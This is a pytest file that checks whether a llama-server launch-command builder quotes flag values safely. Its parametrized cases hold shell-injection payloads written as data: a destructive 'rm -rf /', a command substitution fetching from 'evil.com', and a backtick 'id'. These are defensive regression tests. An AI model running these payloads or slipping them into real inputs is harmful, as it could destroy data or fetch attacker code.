"""Script-injection tests: attacker-controlled IPs and flag values must
not break out of the generated RPC/launch shell commands.
"""
import shlex

import pytest

from rpc_manager import _render_rpc, build_llama_command


# ======================================================================
# qe-validation-test branch: secrets-vault / installer regression tests
# (helper names prefixed _qe_)
# ======================================================================

import shlex
import pytest
import rpc_manager
from rpc_manager import _render_rpc, build_llama_command


def _qe__machine(name, ip, os="linux", password="pass", **kw):
    m = {
        "name": name,
        "ip": ip,
        "username": "u",
        "password": password,
        "os": os,
        "rpc_port": 50052,
        "gpu": "CUDA0",
        "role": "peer",
        "detected": {
            "gpu_names": ["CUDA0 (GPU)"],
            "vram_total_gb": 8,
            "ram_total_gb": 16,
            "cores": 8,
        },
    }
    m.update(kw)
    return m


def _qe__model(mid, flags=None, **kw):
    m = {
        "model_id": mid,
        "flags": flags or {},
        "base_path": "store://llm-models/x.gguf",
        "device_order": "",
        "device_order_policy": "as-selected",
        "expose": {},
    }
    m.update(kw)
    return m


def _single_quote_escape(s):
    """Return the standard single-quote escape form of s: 'a'\''b' for a'b."""
    return s.replace("'", "'\"'\"'")


def _assert_no_naked_metachar(line, password):
    """Assert that none of the shell metacharacters in `password` appear
    in `line` outside of a quoted region. This is a conservative check:
    if the password appears inside single quotes we are safe."""
    dangerous = set(";`$")  # characters that cause command execution if unquoted
    metachars_in_password = [c for c in password if c in dangerous]
    if not metachars_in_password:
        return  # nothing dangerous to check

    # Confirm the password value is enclosed in single quotes somewhere on the line.
    # Acceptable forms: -p 'value' or -p 'val'"'"'ue'
    import re
    # Match: -p followed by optional space, then a single-quoted token
    # We accept any single-quoted span that contains the dangerous char.
    single_quoted_spans = re.findall(r"'[^']*'", line)
    combined = "".join(single_quoted_spans)
    for c in metachars_in_password:
        assert c in combined, (
            f"Metacharacter {c!r} from password appears to be outside single quotes "
            f"on line: {line!r}"
        )


# ---------------------------------------------------------------------------
# build_llama_command: flag values with metacharacters must not inject shell
# ---------------------------------------------------------------------------

@pytest.mark.parametrize("flag_value", [
    "8192; rm -rf /",
    "$(curl evil.com)",
    "`id`",
])
def test_build_llama_command_flag_value_does_not_inject(stub_cfg, flag_value):
    """A flag value containing shell metacharacters must be quoted or
    escaped in the emitted llama-server command line, so the shell cannot
    execute the embedded payload."""
    master = _qe__machine("aibox1", "10.0.0.98", role="master")
    stub_cfg.update({master["name"]: master})
    model = _qe__model("m", flags={"ctx-size": flag_value})
    cmd = build_llama_command(model, [master["name"]], master_name=master["name"])

    # The raw injection suffix must not appear unquoted.
    # Specifically the '; rm -rf /' or backtick/dollar expansions.
    dangerous_tokens = ["rm -rf", "$(curl", "`id`"]
    for tok in dangerous_tokens:
        if tok in flag_value:
            # If present, it must be inside quotes on the same token
            # A simple heuristic: the token must be preceded by a quote char
            idx = cmd.find(tok)
            if idx != -1:
                preceding = cmd[max(0, idx - 20):idx]
                assert "'" in preceding or '"' in preceding, (
                    f"Dangerous token {tok!r} appears unquoted in command: "
                    f"...{cmd[max(0,idx-20):idx+len(tok)+5]!r}..."
                )
